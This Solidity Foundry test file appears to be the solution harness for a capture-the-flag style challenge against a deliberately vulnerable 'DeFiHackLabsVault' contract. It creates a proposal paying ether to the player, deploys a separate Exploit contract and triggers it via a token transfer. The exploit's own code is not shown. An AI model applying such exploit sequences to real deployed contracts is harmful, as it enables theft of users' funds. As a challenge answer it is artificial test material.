// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {DeFiHackLabsVaultBaseTest} from "test/DeFiHackLabsVault/DeFiHackLabsVaultBase.t.sol";
import {DeFiHackLabsVault} from "src/DeFiHackLabsVault/DeFiHackLabsVault.sol";
import {Exploit} from "src/DeFiHackLabsVault/Exploit.sol";

contract DeFiHackLabsVaultTest is DeFiHackLabsVaultBaseTest {
    Exploit private exploit;

    function testDeFiHackLabsVaultExploit() public checkSolved {
        // Do not use any cheat codes here.
        DeFiHackLabsVault.Proposal memory proposal;
        proposal.receiver = player;
        proposal.executed = false;
        proposal.amount = 7 ether;
        uint256 id = deFiHackLabsVault.createProposal{value: 1 ether}(proposal);

        exploit = new Exploit(address(deFiHackLabsToken), address(deFiHackLabsVault));
        deFiHackLabsToken.safeTransferFrom(player, address(exploit), 1, 1, "");
        exploit.exploit(id);
    }
}
